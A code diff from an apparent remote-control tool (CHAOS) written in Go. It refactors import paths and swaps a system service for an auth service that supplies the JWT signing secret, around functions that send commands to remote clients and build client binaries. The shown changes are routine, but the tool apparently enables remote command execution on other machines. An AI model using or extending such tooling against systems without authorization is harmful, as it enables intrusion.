@@ -4,12 +4,12 @@ import (
 	"context"
 	"fmt"
 	"github.com/google/uuid"
+	"github.com/tiagorlampert/CHAOS/internal/utilities"
+	"github.com/tiagorlampert/CHAOS/internal/utilities/constants"
+	"github.com/tiagorlampert/CHAOS/internal/utilities/image"
+	"github.com/tiagorlampert/CHAOS/internal/utilities/jwt"
+	"github.com/tiagorlampert/CHAOS/internal/utilities/system"
 	repo "github.com/tiagorlampert/CHAOS/repositories"
-	"github.com/tiagorlampert/CHAOS/shared/utils"
-	"github.com/tiagorlampert/CHAOS/shared/utils/constant"
-	"github.com/tiagorlampert/CHAOS/shared/utils/image"
-	"github.com/tiagorlampert/CHAOS/shared/utils/jwt"
-	"github.com/tiagorlampert/CHAOS/shared/utils/system"
 	"os/exec"
 	"strings"
 	"time"
@@ -19,22 +19,26 @@ const secretKeySize = 50
 
 type clientService struct {
 	appVersion     string
-	repository     repo.System
+	repository     repo.Auth
 	payloadService Payload
-	systemService  System
+	authService    Auth
 }
 
-func NewClient(appVersion string, repository repo.System, payloadCache Payload, systemService System) Client {
+func NewClient(
+	appVersion string,
+	repository repo.Auth,
+	payloadCache Payload,
+	authService Auth) Client {
 	return &clientService{
 		repository:     repository,
 		payloadService: payloadCache,
 		appVersion:     appVersion,
-		systemService:  systemService,
+		authService:    authService,
 	}
 }
 
 func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error) {
-	addr, err := utils.DecodeBase64(input.MacAddress)
+	addr, err := utilities.DecodeBase64(input.MacAddress)
 	if err != nil {
 		return SendCommandOutput{}, fmt.Errorf(`error decoding base64: %w`, err)
 	}
@@ -56,12 +60,12 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 		}
 	}
 
-	res := utils.ByteToString(payload.Response)
+	res := utilities.ByteToString(payload.Response)
 	if payload.HasError {
 		return SendCommandOutput{}, fmt.Errorf(res)
 	}
 	if len(strings.TrimSpace(res)) == 0 {
-		return SendCommandOutput{Response: constant.NoContent}, nil
+		return SendCommandOutput{Response: constants.NoContent}, nil
 	}
 	return SendCommandOutput{Response: res}, nil
 }
@@ -73,7 +77,7 @@ func HandleResponse(payload *PayloadData) (*PayloadData, error) {
 		if err != nil {
 			return nil, err
 		}
-		payload.Response = utils.StringToByte(file)
+		payload.Response = utilities.StringToByte(file)
 		break
 	default:
 		return payload, nil
@@ -101,11 +105,11 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 }
 
 func (c clientService) generateNewToken() (string, error) {
-	params, err := c.systemService.GetParams()
+	auth, err := c.authService.First()
 	if err != nil {
 		return "", err
 	}
-	return jwt.NewToken(params.SecretKey, jwt.IdentityDefaultUser)
+	return jwt.NewToken(auth.SecretKey, jwt.IdentityDefaultUser)
 }
 
 func handleOSType(osType system.OSType) string {
